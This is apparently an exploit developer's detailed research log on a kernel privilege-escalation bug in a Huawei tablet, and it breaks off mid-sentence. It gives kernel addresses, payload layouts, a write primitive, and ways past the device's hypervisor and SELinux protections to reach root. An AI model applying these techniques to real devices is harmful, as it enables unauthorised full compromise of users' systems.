# MRX-W09 × CVE-2026-43499 (GhostLock) — 判明した事実の全体記録

Device: **Huawei MRX-W09** (Kirin 990, arm64, Linux **4.14.116**, EMUI 11.0.0.235,
SELinux enforcing, `LTO_CLANG=y` + `CFI_CLANG=y`, `CONFIG_DEBUG_SPINLOCK=y`,
`CONFIG_PREEMPT=y`, 39-bit VA, ticket spinlocks, **HKIP/HHEE active**).
Reference kernel image: `F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf`
(symbol list: `nm_vmlinux.txt`). All addresses below are **link-time**; add the
KASLR slide at runtime.

---

## 1. Trigger (verified, deterministic)

`FUTEX_WAIT_REQUEUE_PI` + `FUTEX_CMP_REQUEUE_PI` → **`-EDEADLK` (-35)** every
run, leaving a **dangling `rt_waiter`** on the waiter thread's kernel stack at
`task->pi_blocked_on` (task_struct + 0xB08).  The stale waiter `W` sits at

```
W = entry_SP - 0x1d0        (entry_SP = SP at the syscall handler on that thread)
waiter->task = W + 0x30     waiter->lock = W + 0x38
waiter->prio = W + 0x40     waiter->deadline = W + 0x48
```

## 2. Leaks (verified)

* **KASLR slide**: perf `PERF_SAMPLE_IP` on kernel IPs (perf is unlocked via the
  dumpstate libc-page-cache hook below).
* **`task_struct`**: perf `PERF_SAMPLE_REGS_INTR` sampling `__schedule`
  (`0xffffff8009ea5ac8`), register **x23 = `sp_el0` = `current`** (the `mrs x23,
  sp_el0` at `__schedule+0x60` is never overwritten).
* **waiter address**: perf sampling `do_futex` + `sp` → `W = do_futex_sp + 0xc0`.

## 3. HKIP (fully decoded — see HKIP_DECODED_20260922.md for the long form)

* Per-PID bit arrays (all `.bss`, one 4 KiB page, bit = `pid`):
  `hkip_uid_root_bits` 0xffffff800b42c000, `hkip_gid_root_bits` …d000,
  `hkip_addr_limit_bits` …e000.  They are registered with the hypervisor as
  **ROWM** by `hkip_critdata_init` via `hkip_hvc2(0xC6001040, arr, 0x1000)` ⇒
  **a plain kernel write to them is dropped by the HHEE** (useless).
* Bit set/clear only via **`hkip_update_xid_root()`** (called by `commit_creds`)
  and **`hkip_init_task()`** (called by `copy_process`), which issue
  `hkip_hvc2(0xC6001050, array, pid, value)`.  So **let the kernel install the
  creds for you**.
* `hkip_check_uid_root()` (`0xffffff80092c4cf0`) logic:
  `pid = current->pid`; **`pid == 0` → return 0 (allow)**; else test the bit;
  else escalate iff `uid==0 || euid==0 || suid==0 || *(cred+40)!=0 ||
  *(cred+48)!=0 || fsuid==0` → `printk("UID root escalation!")` +
  `force_sig(SIGKILL)` on `current`, returns -1.
  **Note the field set: it reads cred+4/+20/+12/+40/+48/+28 — it does NOT read
  `cap_effective` (cred+0x38).**
* Callers (full `.kernel` scan for `bl` to the cfi bodies):
  `generic_permission` (root-owned inodes), `__cap_capable`, `cap_capable`,
  `cap_capset`, `cap_task_prctl` (PR_SET_SECUREBITS), `cap_vm_enough_memory`,
  `cap_mmap_addr`, `selinux_inode_setxattr`, `selinux_inode_getsecurity`,
  `selinux_setprocattr`, and (via `hkip_check_xid_root`) `copy_process+0x20c`
  (every fork) and `prepare_creds+0x338` (every cred transition).
  All of them evaluate the **current** (old) cred.
* `security_hook_heads.capable` = 0xffffff8009ec0730 (verified: `security_capable.cfi`
  does `adrp x23,0xffffff8009ec0000 ; add x23,x23,#0x730` and iterates that list).
  It lives in `__ro_after_init` ⇒ **emptying it is not possible** (a store there
  takes a *permission fault* → panic; tested).

## 4. Carriers (measured on this vmlinux)

| carrier | dest rel. entry_SP | bytes | covers `waiter->lock` (E-0x198)? |
|---|---|---|---|
| FPSIMD `rt_sigreturn` | E-0x270 | 0x200 | yes — but one-shot + signal return can corrupt the stack canary (`work_pending → __schedule`) |
| **IPv4 `setsockopt(MCAST_BLOCK_SOURCE)`** | **E-0x248** | **0x108** | **yes (offset 0xb0)** — plain repeatable syscall |
| IPv6 MCAST_*_SOURCE | E-0x2b0 | 0x108 | lock at 0x118 ✓ but the waiter tail/`prio` region is clipped |
| `pselect6` / `select` | E-0x210 / E-0x1f0 | 0x78 | no ("one slot short" — reproduces other ports) |
| `ppoll`/`do_sys_poll` | E-0x424 | ≤0xf0 | no |

IPv4 chain (verified by disassembly): `SyS_setsockopt(0x60) →
sock_common_setsockopt(0x40) → udp_setsockopt(0x30) → **bl do_ip_setsockopt**
(0x1b0)`, copy at `do_ip_setsockopt+0x2a4`: `add x0,sp,#0x38 ; mov w2,#0x108 ;
bl __arch_copy_from_user` ⇒ **dest = E-0x248**.  `ip_setsockopt` is *not* in the
path (`udp_setsockopt+0x54` calls `do_ip_setsockopt` directly).
`optname=43`, `IPPROTO_IP=0`, buffer 0x108 (`sizeof(struct group_source_req)`);
the family check (`gsr_group.gr_group.ss_family != AF_INET || gsr_source…`)
*bails right after the copy* (`-EADDRNOTAVAIL`, errno **99**) — which is what
`--gsettest` uses to prove the copy runs.

### Measured payload placement (`--mcastcal` canary)
Buffer slot 0 lands at **W-0x78** ⇒ with W at buffer offset **0x78**, the fake
`rt_mutex` (which needs 0x30 bytes) fits only *below* the waiter:
**fake lock at buffer 0x48 = W-0x30**.

## 5. The write primitive

Payload at buffer offset 0x78 (the waiter) and 0x48 (the fake rt_mutex):
`wait_lock` 0x18 zero, `waiters.rb_root=0`, **`waiters.rb_leftmost = W-0x20`**,
`owner=0`; waiter: `pc=value`, `task=&init_task`, `lock=W-0x30`,
**`prio=0x7fffffff`** (removes the `rt_mutex_waiter_equal` "cold" gate that the
kernel re-poisons to `task->prio` after each erase), `W+0x18 = lock` (so
`rt_mutex_top_waiter()`'s `BUG_ON(w->lock != lock)` passes:
`*(rb_leftmost+0x38) = *(W+0x18)`).

Two layouts (both verified in `rb_erase_cached.cfi`):
* **Case B (pointer writes)**: `rb_right = target`, `rb_left = 0` ⇒
  `*(target) = value` is the **first** memory access (`+0x88`).  Verified on
  device: `--storetest` wrote `&init_cred` into `sysctl_perf_event_paranoid` and
  read it back (`[WRITE OK]`, first attempt).
* Case A (`rb_left = target`, `rb_right = 0`) is used for **`value == 0`**
  (the Case-B path does **not** store for 0; measured).
* The erase's **side effect** writes into `value` (`value+8`), so `value` must be
  a writable kernel address — or one whose +8 is harmless.

Useful constants: `sysctl_perf_event_paranoid` 0xffffff800adda5f4 (readable
oracle), `init_cred` 0xffffff800adfcd28, `init_task` 0xffffff800adeb4c0,
`security_hook_heads.capable` 0xffffff8009ec0730, `system_wq` 0xffffff800add9f28,
`call_usermodehelper_exec_work.cfi` 0xffffff800819571c.
Read primitive: repoint `random_table[5].data` (`0xffffff800b09cfe8`) with the
write primitive and read `/proc/sys/kernel/random/boot_id` (16 bytes) —
implemented as `rd16/rd64`.

## 6. Endgame designs

1. **`--capeff` (current best; 2 walks + 1 syscall)** — HKIP does not read
   `cap_effective`, but `capable()` does:
   ```
   A) rd64(task+0x9E8) -> cred
   B) do_write(value, cred+0x38)   ; value = (W & ~0xff)|0x80  (CAP_SETUID in the low byte,
                                   ;  side effect lands inside our own window)
   C) setresuid(0,0,1)
        __cap_capable: HKIP sees a NON-root cred (uid=2000, cap_inheritable/permitted=0) -> allow
                       and cap_effective has CAP_SETUID -> capability test passes
        prepare_creds: HKIP reads the OLD (non-root) cred -> allow
        commit_creds(new uid=0) -> hkip_update_xid_root(new) -> HVC 0xC6001050
                                 -> the hypervisor sets OUR pid's bit
   D) uid 0 + bit set = legal root -> fork/exec/proof freely
   ```
2. `--pid0` (older): zero-write `task->pid=0` then `cred=&init_cred` then
   `pthread_create` (needs 2 walks and a working zero write).
3. Superset/fallback: forge a `subprocess_info`/`work_struct` in the stamped
   window and splice it into `system_wq`'s (writable) worklist so the kernel
   spawns a root usermode helper (HKIP-sanctioned because the kworker already has
   its bit) — the A17 technique; not implemented here.

## 7. Exploit modes (`ghostlock_mrx.c`)

`--leak` leak only · `--armonly` arm stamp only · `--canary` slot canary ·
`--gcal` sigreturn canary · `--scan <off>` · `--probe` · `--gsettest` proves the
MCAST copy runs (errno 99) · `--mcastcal` canary calibration of the copy dest ·
`--storetest` end-to-end write check via perf_paranoid · `--qzero` zero write ·
`--hkip` (futile: ROWM) · `--capempty` empty capable list (impossible: RO page) ·
`--pid0` pid=0 route · `--capeff` cap_effective hole · `--captest` single-run
validation of the same (walk→capget→setresuid) · `--fs` fork-storm ·
`--upstream` boot_id read chain · `--root <idx>` cred write probe.

## 8. Device procedures

* perf unlock per boot: `inject_hook place 0x84000 0x244 0x7a3d8` ;
  `inject_hook hook 0x7a3d4 0x84000` ; `nohup bugreportz & sleep 20` ;
  `inject_hook restore 0x7a3d4 0xd10403ff`.
* kernel log: `dmesg` is restricted; **`pstore` is the channel** —
  `adb exec-out cat /sys/fs/pstore/console-ramoops-0` (directory listing denied,
  file read allowed) — **and reading it consumes it**; read it right after a panic.
* the stamper (y thread) is pinned to **CPU 7**, the quietest per `/proc/interrupts`
  (GICv3 ~5.6k vs ~23k on CPU 0).
* verification channels: `/proc/sys/kernel/perf_event_paranoid` (writable oracle),
  `capget(2)` (proves `cap_effective`), `rooted.txt` + `ps -o USER` (proof file and
  uid), `/dev/kmsg` (markers in pstore), pstore absence of `UID root escalation!`.

## 9. Known flaws / open items (design audit)

1. **Fatal rate of a walk is high** (grind: 13 cycles → 10 panics, ~1 landing).
   Two panic classes: (a) the walk reads a *torn* window (the y thread re-issuing
   the copy) → `rt_mutex_top_waiter` BUG or a translation fault; (b) the stamper's
   signal return corrupts a stack canary.  Fix applied but **unverified**: copy
   **once** and then spin in *user* space (no syscalls) so the window is stable.
2. `cap_effective` write's side effect previously pointed at a **ROWM page**;
   now it points inside our own stamped window (harmless) — **unverified** after
   the change.
3. `hot_wait()` spends up to 20 walks per read → amplifies (1); should be capped.
4. **CONFIRMED BLOCKER (2026-09-23): SELinux, not just HKIP.**  `capset(2)`
   with all-zero capability sets — a no-op that `cap_capset`'s subset test
   accepts — returns **-EPERM** on this device.  The only remaining denier is
   `selinux_capset` (`capability2 setpcap` for the shell domain), so
   `setresuid(0,0,1)` will likewise be denied by `capability2 setuid` even when
   `cap_effective` holds CAP_SETUID.  ⇒ **The `cap_effective` hole is real for
   Linux's own capability test but SELinux stops the call before commit_creds.**
   The endgame must therefore neutralise SELinux as well — the practical route
   is the **AVC cache** (not in a protected pool): overwrite
   `avc_node->ae.avd.allowed` with a pointer value whose low bits carry the
   needed permission bits.  `selinux_state.enforcing` is not usable
   (`CONFIG_SECURITY_SELINUX_DEVELOP` off ⇒ compile-time constant).
   The same run also **proved `leak_cred()` is safe** (see #7).
5. **Zero writes are impossible with this primitive** (measured): Case A
   dereferences `value+16` before storing, so `value=0` faults; Case B's
   `parent == 0` early-out skips the store.  Only *readable kernel addresses*
   (and any pointer value) can be written.
6. **`sys_capset` header quirk**: `header.pid` is interpreted as a *uid* and the
   call is rejected with -EPERM unless it equals `current_uid()`/`current_euid()`.
   Use `pid = getuid()`.
7. **`leak_cred()` (perf, ZERO walks) works and is safe**: `capset()` drives
   `prepare_creds()`→`commit_creds()`; sampling `commit_creds.cfi` and reading
   **x19** (= `new`, callee-saved) yields `current->cred` without touching the
   kernel stack.  Three consecutive runs completed with the device still up
   (no panic).  This reduces the endgame to **one walk** (the cred write).

## 9b. Breakthroughs (2026-09-23)

* **`cred->security` offset = 0x78** (from `selinux_cred_free`: `ldr x0,[x0,#120]`;
  `selinux_cred_prepare`: `str x8,[x19,#120]`), and the blob is a 0x18-byte
  `task_security_struct` whose **sid is at blob+4** (`selinux_kernel_act_as`
  loads `w0,[x8,#4]` and passes it to `avc_has_perm` as ssid).
* **SELinux-neutralising endgame (`--sid`)**: `selinux_state.enforcing` is a
  compile-time constant and denied perms are not cached in the AVC, so instead
  we make ourselves the *kernel domain*:
  - the payload window (0x108 bytes; the first 0x48 are free) holds a **fake
    `task_security_struct` with sid = 1 (`SECINITSID_KERNEL` => `u:r:kernel:s0`)**
    at buffer 0 = absolute address `W-0x78`;
  - one pointer write `cred->security = W-0x78`;
  - **`capset()` is the oracle**: it returns -EPERM while SELinux denies
    `capability2 setpcap`, and 0 once we are in the kernel domain;
  - then one more pointer write `cred->cap_effective = <ptr with CAP_SETUID>`
    (HKIP never reads cap_effective, but Linux's `capable()` does);
  - `setresuid(0,0,1)` -> `prepare_creds` (the *old* cred is non-root, so every
    HKIP hook allows) -> `commit_creds(new uid=0)` -> `hkip_update_xid_root` ->
    HVC sets our bit => **uid 0 + kernel SID + HKIP bit**.
  - `selinux_cred_prepare` *copies* the blob, so the fake sid survives later
    cred changes.
* **`leak_cred()` works, with ZERO walks**: a multi-trigger loop (`capset`,
  **`setfsuid`**, `keyctl`) reaches `commit_creds` even though `capset` itself is
  SELinux-denied (the denial only skips the change, not the commit).  Sampling
  `commit_creds.cfi` and taking the **last** x19 sample yields *our current*
  cred (each commit frees the previous cred, so a frequency vote would pick a
  stale object).  Verified on device.
* Remaining limiter: the **walk's fatal rate (~50%)** — a torn window gives the
  `rt_mutex_top_waiter` BUG or a translation fault.  `--sid` needs 1-2 walks
  (the cap_effective walk runs only after the capset oracle succeeds).

## 9c. Window freshness vs tearing (measured)

Two failure modes of the stamped kernel-stack window were separated
experimentally:

* **One-shot copy (stale window)**: `--mcastcal` (canary) then did **not** fault,
  i.e. the walk never saw the canary => the window had already been clobbered.
  A deep Huawei IRQ handler on the stamper's CPU overwrites the region within
  microseconds, so a single copy leaves a *stale* window and **every walk is
  cold** (benign, no panic - which is why a whole `--captest` run of 5 attempts
  completed with the device still up, yet `capget eff=0`).
* **Continuous re-copy (torn window)**: the walk then reads a *partially*
  written window -> `rt_mutex_top_waiter` BUG / translation fault -> panic.
* **Chosen design (`copy -> trigger -> pause`, x3)**: refresh the window, fire
  the trigger immediately (the consumer reacts in ~us), then pause ~1 ms so the
  window is **stable while that walk reads it**.  Verified: `--storetest` went
  from permanently-cold back to "lands or panics", i.e. the walk really reads a
  fresh window again.  Remaining variance is the known ~50% walk lottery.

Net effect: the endgame needs 1-2 walks and each walk is a coin flip between
landing, being cold, and panicking; hence the reboot churn.


## 9d. Root cause of the 8/8 panics: the pre-erase `rt_mutex_top_waiter` guard

A panic register dump (pstore, `pstore_last.log`) pinned the fault down exactly:

```
kernel BUG at kernel/locking/rtmutex_common.h:59      <- BUG_ON(w->lock != lock)
PC is at rt_mutex_adjust_prio_chain+0xaf0/0xbac
x25: fffffff2341e7cf0   x24: fffffff2341e7cc0   x3: fffffff2341e7cc0   x8: 0
```

Disassembling `rt_mutex_adjust_prio_chain` (ELF 0xffffff800822ea28) shows the
BUG at +0xaf0 is reached from a **single** site, `+0x294`, which is *immediately*
before the first `bl rb_erase_cached` at `+0x2b0`:

```
+0x294   ldr  x8, [x24,#32]      ; x8 = lock->waiters.rb_leftmost
+0x2a0   str  x8, [sp,#8]
+0x2a4   ldr  x8, [x8,#56]       ; x8 = ((struct rt_mutex_waiter*)x8)->lock
+0x2a8   cmp  x8, x24            ; == lock ?
+0x2ac   b.ne +0xaf0             ; no -> BUG_ON(w->lock != lock)
+0x2b0   bl   rb_erase_cached    ; <-- the *(target)=value store
```

x24 == x3 == `waiter->lock` read by the caller (`rt_mutex_adjust_pi.cfi+0xc8`:
`ldr x20,[x8,#56]` with `x8 = task->pi_blocked_on`) and x25 == `task->pi_blocked_on`
itself, so both the caller and the guard were reading **our** stamped window
(`lock = W-0x30` was read correctly).  The guard failed only because
`*(lock->waiters.rb_leftmost + 0x38)` read back as 0, i.e. the window had already
been **re-copied/rewritten underneath the live walk**.  Hence: a copy in flight
while the walk reads is *fatal*, not merely racy, and extra walks on one request
can only panic.

The *other* observed signature is the same walk dying ~0x180 bytes earlier:
`PC = rt_mutex_adjust_prio_chain+0x140`, `x24 = waiter->lock = 0x80001000`
(a deterministic stack-garbage value seen on two different boots) - i.e. the
window did not cover `W` at all when the walk read it.

## 9e. Geometry re-proved on the shipping build (index canary)

`--mcastcal` (every 8-byte slot = `0xdead0000+i`) on the *current* binary:

```
Unable to handle kernel paging request at virtual address dead0016
PC is at rt_mutex_adjust_prio_chain+0x140/0xbac
x25: ffffffe0eb16bcf0   x24: 00000000dead0016
[y] waiter_abs=0xffffffe0eb16bcf0
```

`x25` equals the value printed by the exploit as `waiter_abs`, and the canary
slot that landed on `waiter->lock` (W+0x38) is `0x16`, i.e. buffer offset 0xB0.
So **base = W-0x78, fake lock = W-0x30, waiter = W** is exact for this build, and
the MCAST copy provably lands in the window.  Any future edit to the userspace
code around the syscall must re-run `--mcastcal` and re-derive this slot.

## 9f. The MCAST handler's *post-copy* code path reuses the window slot

Root cause of the intermittent "cold" / garbage-lock walks is **not** an IRQ:

* the copied object is a `struct group_source_req`, whose `gsr_group.ss_family`
  is at buffer **+0x08** and `gsr_source.ss_family` at **+0x88**;
* with both families = 0 (AF_UNSPEC) the structured Case-B payload leaves exactly
  those bytes zero, and `ip_mc_*` then takes a *deeper* path that reuses this very
  stack slot - the walk afterwards sees kernel frame garbage instead of the
  payload (measured lock value `0x80001000`, identical on two boots);
* the index canary has `+0x08 = 0x0001` and always reads the window intact, which
  is why the canary "works" and the real payload does not.

It has NOT been possible to fix this by making the family non-zero, because
`+0x88` is `w[2]` (`tree_entry.rb_left`) and *must* stay 0 for the Case-B erase,
so only the group family can be set (`g_sbuf[8]=1` in `build_v2`).

A related trap discovered in the same round: trying to "stay in a deep frame" to
shield the window with a second `do_ip_setsockopt()` call (e.g. IPPROTO_IP/IP_TTL)
is actively harmful - that function's locals start at the same `sp+0x38` slot, so
IP_TTL overwrites the first half of the window.  The stamper therefore only
re-copies MCAST_BLOCK_SOURCE and then waits in user space.

State after the mitigation (`--captest`, 5 consecutive attempts, no panic at all):
the walk is now benign, but `capget eff=0` shows the store still does not land,
i.e. the walk is reading a window that is *valid-looking* but no longer ours.

## 9g. Remaining design flaws (audit)

1. **Window reuse by the stamping syscall itself** (9f): the only user->kernel
   write we have lands in a slot the same syscall may reuse.  Fix: use a stamp
   whose handler bails *before* touching its own frame (upstream/A17 use a
   different carrier), or place the fake rt_mutex/waiter in a region the handler
   cannot reuse.
2. **The walk mutates the y task's real PI state**: `rt_mutex_adjust_prio_chain`
   calls `rt_mutex_dequeue_pi/enqueue_pi` against `task->pi_waiters` using our
   fake `pi_tree_entry`, so the y task's real tree can be corrupted (one of the
   panics shows a chain invocation whose operands `x25=0x40, x24=0, x3=4` are not
   ours at all - a later, real PI operation tripping over the damage).
3. **`value` RB-colour constraint** (9d): pointer writes need `value` to point at
   a black-ish node; not yet satisfied by the `cap_effective`/`*security` writes.
4. `cred->security`/SELinux: the `sec->sid` bypass is designed but never exercised
   (both `--captest` and `--sid` die in the carrier before the oracle).


## 9h. THE WRITE PRIMITIVE IS VERIFIED, SAFELY (this is the real breakthrough)

`--storetest` now reports **`[WRITE OK]`** *and the device stays up* (`exit=0`,
no pstore entry), reproduced on two separate builds:

```
[*] storetest 2: *(sysctl_perf_event_paranoid) = blackval
[*] [!] WRITE OBSERVED (witness) (uid=2000) ack=0 gset=-1
[*] paranoid='1907506320' got=1907506320 want=1907506320 [WRITE OK]
```

i.e. an arbitrary 8-byte write `*(target) = value` through the rt_mutex erase,
with the target read back from a file.  The complete recipe (all five are
required - each one was isolated by a distinct panic signature):

1. **Geometry**: copy base = `W-0x78`, fake rt_mutex = `W-0x30`, waiter = `W`
   (re-proved on the shipping build with the index canary: slot 0x16 -> `W+0x38`).
2. **`lock->waiters.rb_leftmost` (`lock+0x20`) = `W-0x20`, NOT `W`.**  If it
   equals the erased node, `rb_erase_cached()` runs its
   `rb_leftmost = rb_next(node)` path, which walks through our `rb_right`
   (= target) into foreign kernel memory: measured panic at
   `rb_erase_cached+0x13c`, `x8 = &root->rb_leftmost`, LR
   `rt_mutex_adjust_prio_chain+0x2b4`.  `W-0x20` still satisfies the pre-erase
   guard, which reads `(*rb_leftmost)->lock` = `*(W-0x20+0x38)` = `*(W+0x18)`
   = `w[3]`, and we set `w[3] = lock` for exactly that.
3. **`value` must be an RB_BLACK node**: the walk re-inserts the waiter with
   `rb_insert_color_cached(..., leftmost=false)`, which reads
   `rb_is_black(node->__rb_parent_color) = *(value) & 1` and, when that is 0,
   descends into `*(value) & ~3` and faults.  So `value` must be an address
   whose first word we make odd.  `build_v2()` therefore picks a slot inside
   our own stamped window (`g_blackval`), sets it to 1, and additionally
   requires bit 7 in the low byte so that `cap_raised(cap_effective,
   CAP_SETUID)` is true - one slot satisfies both the tree invariant and the
   capability check.
4. **`group_source_req` family bytes**: buffer `+0x08` (`gsr_group.ss_family`)
   and `+0x88` (`gsr_source.ss_family`).  `do_ip_setsockopt` bails shallowly
   (+0xf60, -EADDRNOTAVAIL) only when they are not AF_INET; with both zero the
   handler takes a path that *reuses the very stack slot* holding the window
   (measured deterministic `waiter->lock = 0x80001000` on two different boots).
   `+0x88` is `w[2]` (`tree_entry.rb_left`) and must stay 0 for the Case-B
   erase, so only `g_sbuf[8]=1` can be set.
5. **One copy, one trigger, wait for the walk**: a re-copy while the walk reads
   is fatal - proven by the `rtmutex_common.h:59` BUG at
   `rt_mutex_adjust_prio_chain+0x294` with `x24 == x3 == W-0x30` and `x25 == W`
   (i.e. the walk *had* read our window correctly), where the guard then read
   `*(rb_leftmost+0x38)` back as 0.

Also corrected: the claim in 9d that "zero writes are impossible".  With
`value = 0` the Case-1 erase takes `parent = NULL` ->
`__rb_change_child(..., root)` -> `if (child) child->__rb_parent_color = pc`,
i.e. **`*(target) = 0` does store**, and the re-insert takes the
`!rb_red_parent(node)` branch and is safe.  `build_v2()` must therefore use the
Case-B layout (`w[1] = target, w[2] = 0`) for `value == 0` too (it currently
switches to Case A).

## 9i. `commit_creds` sampling and the per-thread cred lifetime

* `commit_creds.cfi` disassembly: `mov x19, x0` at `+0x28` and x19 is used as
  `new` for the *whole* function (`[x19]`, `[x19,#20]`, `[x19,#24]`,
  `[x19,#28]`, `[x19,#32]`, `[x19,#136]`, `[x19,#48]`, ... `[x19,#28]`,
  `[x19,#32]`).  So sampling `commit_creds` and reading x19 is the right leak.
* **Newly identified hazard**: threads share one cred *object* but each
  `task_struct` has its own `cred` pointer, and every `commit_creds()` frees the
  object it replaces.  The `leak_cred()` trigger burst (thousands of
  `setfsuid`/`keyctl`/`setresuid` commits on the main thread) therefore leaves
  the y and consumer threads pointing at **freed creds** - a use-after-free that
  any later cred access walks into, including the SELinux hook inside the very
  `sched_setattr` we use as the trigger.  Fixed by broadcasting a harmless
  `setfsuid()` commit to those threads after the burst (SIGWINCH handler), the
  same thing glibc's setuid wrapper does.

## 9j. Window corruption: what is established, what is refuted

**Established by measurement**
* **The copy geometry is exactly right.**  On a clean boot the canary run shows
  `dead0005`, `dead0006` and `dead000e` in the target stack at
  `base = W-0x78` - i.e. the MCAST stamp lands exactly where the design assumes
  (fake lock W-0x30, waiter W).
* **The payload does land**, and something then overwrites part of the window
  *during the walk*: in the cleanest record the *lower* canary slots survived
  while `waiter->lock` (W+0x38) read back as the constant `0x80001000`, so only
  the *upper* part of the window is destroyed.
* **A copy in flight is fatal** and the handshake (`g_stamp_paused`) now
  guarantees the walk only starts after the last copy finished.
* **No perf event is armed while the window is live.**  The stamper lists its
  open fds right before stamping: `open fds before stamping: 5`, with *no*
  perf/anon_inode descriptor.  Every perf_event_open in `leak_text`,
  `leak_cred` and `leak_waiter_abs` is disabled and closed on every path.
  **Therefore the perf-hrtimer explanation is REFUTED**; the `(10000,100000)`
  pair found in a clobbered window is *stale* data from the leak phase.
* **Not an external IRQ**: CPU 7 receives 0 counted interrupts over 8 s (CPU 6
  too).  **Not a signal**: blocking every signal in the stamper changes nothing.
* **Nothing in the stamp syscall writes the window**: a full scan of
  `do_ip_setsockopt`'s sp-relative stores finds only `[sp,#40]`/`[sp,#48]`
  (depths 0x258/0x250, outside the window).
* **Zero writes are structurally unusable for heap targets**: with value == 0
  the erase must store `root->rb_node = target`, after which the walk's
  continuation descends into `target` as if it were a waiter (`--zerotest` stored
  and then died at `chain+0x2d8` with `x12 = 0x2710000186a0`).  Pointer writes
  leave `root->rb_node == 0` and take the safe `cbz` branch.

**Refuted / not the cause**
* perf SW-CPU_CLOCK hrtimer during the walk (no perf fd is open - see above).
* the `leak_cred` burden alone (shrinking its burst 30000x8 -> 12x4 changed
  nothing; the A/B "storetest with one leak first panics" is real but the leak's
  effect is not a live perf event).
* dangling-cred UAF (commit_creds frees only at usage==0; CLONE_THREAD shares
  via get_cred).

**Best remaining candidate** (ANALYSIS_STACK_WRITERS.md): the scheduler tick -
`tick_periodic` stores x19 at exactly **E-0x198**, i.e. the `waiter->lock` slot
that was observed corrupted - and other arch_timer PPI work, which
`/proc/interrupts` does not count.

## 9k. The definitive structural fix: a BLOCKING carrier (upstream design)

Upstream GhostLock/A17 do not fight this: they stamp with a **blocking** syscall
(`select`; `src/exp32/stack.c:86-156`) so the thread ends up *sleeping inside the
kernel* with the copied payload frozen in its frame, and every later kernel entry
(interrupt, tick, schedule) pushes frames *below* the window instead of through
it.  A17 additionally keeps the fake lock in a sprayed page and forges a
`fake_task` so the walk never touches real scheduler state.

Measured geometry notes for the port: the syscall-entry frame is
`sub sp,sp,#0x140` (so `E = task_stack+THREAD_SIZE-0x140`), `select`'s three
contiguous `fd_set` buffers give 0x180 controllable bytes at `E-0x1f0`, which
covers the needed `W-0x78..W+0x108`; and `do_select`/`schedule` is then called at
`E-0x240`, i.e. *below* the payload.

Port plan (next): replace `stamp_gset`'s MCAST loop with a `select`-based stamp
whose fd_sets carry the payload, measure the offset with a canary, then block in
`select` while the consumer fires the walk and wake the thread afterwards with a
pipe/signal.  Independent of that, take the cred without perf at all (read
`task->cred`, i.e. `task+0x9E8`, through the `boot_id` primitive after locating
our task via the `init_task.tasks` walk and a `comm` match - the
`upstream_chain()` pattern), which removes the last perf event from the process
and the stale-frame pollution with it.

## 9l. Blocking (select/pselect6) carrier: coverage analysis and run plan

Static derivation now that the geometry is pinned (agent A measured
`S_FRAME_SIZE = 0x140`, so `E = task_stack + THREAD_SIZE - 0x140`; the window is
`W-0x78 .. W+0x90 = [E-0x248, E-0x140]` because the stale rt_waiter sits at
`W = E-0x1d0`).

* The three contiguous fd_sets copied by `core_sys_select` are `3*(nfds/8)` bytes
  and the frame was measured at `E-0x1f0` for `nfds = 1024` -> 0x180 bytes,
  covering `E-0x1f0 .. E-0x70`, i.e. **`W-0x20 .. W+0xb0`**.
* Our current payload does **not** fit that: it needs `W-0x78 ..`, and its fake
  rt_mutex starts at `W-0x30` (`GSET_LOCK = 0x48`), whose first 0x10 bytes
  (`wait_lock`) would sit *outside* the covered region.  `wait_lock` must be
  **zero**, so leaving stale stack there is unsafe.
* Therefore the payload layout must be **re-derived for the select carrier**:
  keep all *live* fake-rt_mutex fields (`waiters.rb_root@+0x18`,
  `rb_leftmost@+0x20`, `owner@+0x28`) and the whole waiter
  (`tree_entry@0, pi_tree@0x18, task@0x30, lock@0x38, prio@0x40, deadline@0x48`)
  inside `W-0x20 .. W+0xb0`, i.e. build the fake lock at `W-0x20` (not `W-0x30`)
  and keep `GSET_LEN` payload bytes starting at `W-0x20` (0xd0 bytes are enough).
  Since the cover ends at `W+0xb0`, the free tail used for canaries
  (`W+0x50..`) stays usable.
* Run plan (device): `--selcal <off>` (canary in the fd_sets -> fault address
  names the slot that landed on `waiter->lock`, exactly like `--mcastcal`), then
  set `g_seloff` accordingly, then `--selstamp` (reuses the storetest loop and
  the perf_paranoid readback) to confirm the write lands **reliably**, then
  `--captest` for the endgame.
* Also noted by the stack-writers analysis: `core_sys_select`'s own frame is
  `>= E-0x210`, so while the thread is *blocked inside it* every later kernel
  entry lands below the window - the property the returning MCAST carrier lacks.


## 9m. Panic reason (readable after clearing the pstore first)

**The pstore ring is saturated by `rcu_read_unlock_special` spam** (hundreds of KB
per run), so the panic *banner* was usually rotated out and only secondary-CPU
`ipi_cpu_stop` lines survived.  **Fix: read (i.e. clear) the pstore immediately
before a run** - the banner then survives and is fully readable.

Measured panics (all with the same signature):

```
kernel BUG at rtmutex_common.h:59          (BUG_ON(rt_mutex_top_waiter(lock)->lock != lock))
PC is at rt_mutex_adjust_prio_chain+0xaf0
x25 = <W>                                  (our leaked waiter - matches the payload echo's lk4)
x24 = <a FOREIGN kernel pointer>           (e.g. 0xffffffc53b06d640, 0xffffffe2d3d5c500)
```

`x24` is the *lock* the caller read from `*(W+0x38)`, i.e. the window's
`waiter->lock` slot - and it holds an unrelated kernel pointer rather than our
`lock` (= W-0x30).  So at the moment of the walk **the stale waiter's original
`lock` (the futex's real rt_mutex) is still there: the stamp copy had not
overwritten the window.**

Verified alongside (same build):
* payload echo is perfect (w0=blackval, w3=w7=lock, lk4=W, fam=1);
* the leaked `waiter_abs` equals the kernel's `x25`;
* `--gsettest`: `setsockopt(MCAST_BLOCK_SOURCE,len=0x108) -> errno 99`
  (EADDRNOTAVAIL) - **the copy really runs**;
* the **index canary DOES reach the window** (fault at `dead0016` = slot 0x16 =
  buffer 0xB0 -> base = W-0x78, repeatedly).

**Open question (the only one left):** the canary copy lands, the structured copy
does not - same syscall, same buffer, same length.  Next test: capture the
same-run payload echo AND the panic together, writing the run's output to a
*device file* (a `| tail` pipeline loses everything when the device panics) so the
payload's `g_sbuf` contents and the walk's read can be compared side by side.

Diagnostics added this turn: pstore-clear-before-run discipline, payload echo,
runtime payload offsets (g_lk_off/g_w_off), --captest-nl / --captest-data A/B,
--selcal / --selstamp (blocking pselect6 carrier, measured NOT to reach the
window for this kernel's frame layout), one-copy and continuous-re-copy stamp
variants.


## 9n. The stamp landing is NOT stable across runs (root of the "clobber" symptom)

Same-run evidence (payload echo written to /dev/kmsg so it survives the panic in the
pstore) and repeated canary measurements:

* `--lockck` (structured payload with w[7] replaced by the canary 0xdead0016) on one
